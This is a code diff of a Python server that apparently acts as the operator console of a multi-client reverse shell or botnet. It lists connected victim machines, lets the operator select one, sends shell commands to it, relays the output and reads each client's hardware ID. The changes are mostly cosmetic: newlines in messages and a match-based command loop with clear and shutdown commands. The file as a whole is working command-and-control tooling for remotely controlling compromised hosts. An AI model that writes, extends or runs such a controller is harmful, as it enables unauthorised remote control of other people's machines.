@@ -1,3 +1,4 @@
+import os
 import socket
 import threading
 import time
@@ -22,7 +23,7 @@ def socket_settings():
         port = ss_settings['port']
         return host, port
     except (KeyError, ValueError, ParsingError) as e:
-        print(f"[!] Error reading settings.ini:\n[!] {e}\n\n")
+        print(f"\n[!] Error reading settings.ini:\n[!] {e}\n\n")
         source.shutdown()    
 
 def socket_server_thread():
@@ -36,7 +37,7 @@ def create_threads():
             t.daemon = True
             t.start()
     except Exception:
-        print('[!] Error')
+        print('\n[!] Error')
 
 def work():
     while True:
@@ -61,7 +62,7 @@ def socket_create():
         ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     except socket.error as e:
-        print(f"[!] Socket creation error: {e}")
+        print(f"\n[!] Socket creation error: {e}")
 
 def socket_bind():
     try:
@@ -69,9 +70,9 @@ def socket_bind():
         global ss
         ss.bind((host, int(port)))
         ss.listen(5)
-        print(f"[*] Listening on {host}:{port}")
+        print(f"\n[*] Listening on {host}:{port}")
     except socket.error as e:
-        print(f"[!] Socket binding error: {e}")
+        print(f"\n[!] Socket binding error: {e}")
         time.sleep(5)
         socket_bind()
 
@@ -89,21 +90,25 @@ def accept_connections():
             IP_ADDRESSES.append(address)
             print(f"\n[*] Connection established: {address[0]}\n[+] > ", end="")
         except:
-            print("[!] Error accepting connections")
+            print("\n[!] Error accepting connections")
 
 def client_connection():
     #queue.task_done()
     while True:
-        cmd = input("[>] ")
-
-        if cmd == 'list':
-            list_connections()
-        elif 'select' in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                get_target_commands(conn)
-        else:
-            print(f"[!] command not recognized: {cmd}")
+        cmd = input("\n[>] ")
+        match (cmd.lower()):
+            case "list":
+                list_connections()
+            case s if s.startswith("select"):
+                conn = get_target(cmd)
+                if conn is not None:
+                    get_target_commands(conn)
+            case "clear" | "cls":
+                os.system('clear')
+            case "shutdown":
+                source.shutdown()
+            case _:
+                print(f"\n[!] command not recognized: {cmd}")
 
 def list_connections():
     results = ""
@@ -116,7 +121,7 @@ def list_connections():
             del IP_ADDRESSES[i]
             continue
         results += f"+ {i}  {IP_ADDRESSES[i][0]}:{IP_ADDRESSES[i][1]} \n "
-    print(f'[*] ----- clients ---- \n {results}\n')
+    print(f'[*] ----- clients ---- \n\n {results}\n')
     return results
 
 def get_target(cmd):
@@ -124,11 +129,11 @@ def get_target(cmd):
         target = cmd.replace('select ', '')
         target = int(target)
         conn = CONNECTIONS[target]
-        print(f"[*] connected to {IP_ADDRESSES[target][0]}")
+        print(f"\n[*] connected to {IP_ADDRESSES[target][0]}")
         print(f"{IP_ADDRESSES[target][0]} $ ", end="")
         return conn
     except:
-        print(f"[!] {target} is not a valid selection")
+        print(f"\n[!] {target} is not a valid selection")
         return None
 
 def get_target_commands(conn):
@@ -140,7 +145,7 @@ def get_target_commands(conn):
             response = send_target_commands(cmd, conn)
             print(response, end="")
         except:
-            print('[!] Unknown error (get_target_commands)')
+            print('\n[!] Unknown error (get_target_commands)')
 
 def send_target_commands(cmd, conn):
     try:
@@ -149,7 +154,7 @@ def send_target_commands(cmd, conn):
             client_response = str(conn.recv(1024), "utf-8")
             return client_response
     except Exception:
-        print("[!] Connection to client was lost")
+        print("\n[!] Connection to client was lost")
         return
 
 def get_hwid(conn):
@@ -159,4 +164,4 @@ def get_hwid(conn):
         hwid = client_hwid.split(maxsplit=1)[0]
         return hwid
     except socket.error as e:
-        print(f"[!] Connection to client was lost {e}")
+        print(f"\n[!] Connection to client was lost {e}")
